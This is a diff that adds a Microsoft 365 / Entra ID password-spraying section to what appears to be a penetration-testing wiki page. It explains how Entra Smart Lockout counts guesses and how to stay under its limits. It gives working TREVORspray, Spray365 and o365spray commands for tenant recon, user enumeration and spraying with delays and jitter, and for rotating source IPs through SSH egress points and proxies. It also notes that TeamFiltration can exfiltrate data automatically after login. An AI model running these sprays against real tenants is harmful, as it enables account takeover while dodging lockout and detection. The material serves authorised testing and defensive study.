@@ -260,6 +260,55 @@ To use any of these tools, you need a user list and a password / a small list of
     [+] Success: s.svensson:Summer2020
 ```
 
+## Microsoft 365 / Entra ID
+
+For cloud spraying, first identify whether the tenant is **managed**, **federated**, or **hybrid**, because the endpoint and the lockout behavior can differ from on-prem AD. In Microsoft Entra, **Smart Lockout** changes how repeated guesses consume the lockout budget:
+
+- Repeating the **same bad password** doesn't keep incrementing the lockout counter, but trying **new candidates** does.
+- **Familiar** and **unfamiliar** locations have **separate** counters.
+- Tenants using **pass-through authentication (PTA)** don't benefit from the bad-password hash tracking, so treat them more like classic lockout-sensitive targets.
+
+In practice, spray **one password per round**, keep enough spacing between rounds, and prefer tooling that can discover the tenant's actual auth flow before sending guesses.
+
+- With [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray), you can recon the tenant, discover the `token_endpoint`, spray `msol`/`adfs`/`owa`/`okta`, and rotate traffic through multiple egress IPs:
+
+```bash
+# Enumerate tenant info, autodiscover, and the token endpoint
+trevorspray --recon corp.com
+
+# Spray against the discovered token endpoint with delay/jitter
+trevorspray -u users.txt -p 'Winter2025!' \
+  --url https://login.windows.net/<tenant-id>/oauth2/token \
+  --delay 5 --jitter 3 --lockout-delay 60
+
+# Round-robin between multiple SSH egress points
+trevorspray -u users.txt -p 'Winter2025!' \
+  --url https://login.windows.net/<tenant-id>/oauth2/token \
+  --ssh root@1.2.3.4 root@4.3.2.1 --delay 5
+```
+
+- With [**Spray365**](https://github.com/MarkoH17/Spray365), you can pre-build a resumable **execution plan**, randomize auth order, and enforce a **minimum delay per user** to stay outside the lockout window:
+
+```bash
+# Generate a plan with shuffled auth order and a per-user minimum delay
+python3 spray365.py generate normal -ep plan.s365 -d corp.com \
+  -u users.txt -pf passwords.txt --delay 30 -mD 1800 \
+  -S -rUA
+
+# Execute the plan and abort after observing several lockouts
+python3 spray365.py spray -ep plan.s365 -l 5
+```
+
+- With [**o365spray**](https://github.com/0xZDH/o365spray), you can validate the tenant, enumerate users with modules such as `onedrive`, and spray via `oauth2` or `adfs` while keeping **one attempt per user** per lockout window. If you already have a FireProx API, pass it with `--proxy-url` to distribute the source IPs:
+
+```bash
+o365spray --validate --domain corp.com
+o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
+o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
+```
+
+Recent operator tradecraft has also moved toward **distributed cloud spraying**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) supports time windows, password shuffling, ADFS/M365 spraying, and automatic post-auth exfiltration. Recent real-world abuse also used **Microsoft Teams API** account enumeration and **AWS region rotation** to spread spray waves across multiple source geographies.
+
 ## Google
 
 - [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
@@ -281,6 +330,8 @@ To use any of these tools, you need a user list and a password / a small list of
 - [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
 - [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 - [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
+- [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
+- [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
 - [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
 - [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
 
